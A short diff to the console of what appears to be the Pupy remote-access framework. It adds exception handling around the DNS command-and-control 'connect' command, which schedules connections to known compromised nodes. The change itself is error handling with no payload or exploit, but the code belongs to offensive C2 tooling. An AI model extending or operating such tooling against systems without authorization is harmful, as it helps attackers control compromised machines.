@@ -1293,13 +1293,17 @@ class PupyCmd(cmd.Cmd):
                 self.display_error('Node {} not found'.format(args.node))
 
         elif args.command == 'connect':
-            count = self.dnscnc.connect(
-                host=args.host,
-                port=args.port,
-                transport=args.transport,
-                node=args.node,
-                default=args.default
-            )
+            try:
+                count = self.dnscnc.connect(
+                    host=args.host,
+                    port=args.port,
+                    transport=args.transport,
+                    node=args.node,
+                    default=args.default
+                )
+            except Exception, e:
+                self.display_error(e)
+                return
 
             if count:
                 self.display_success('Schedule connect {} known nodes'.format(count))
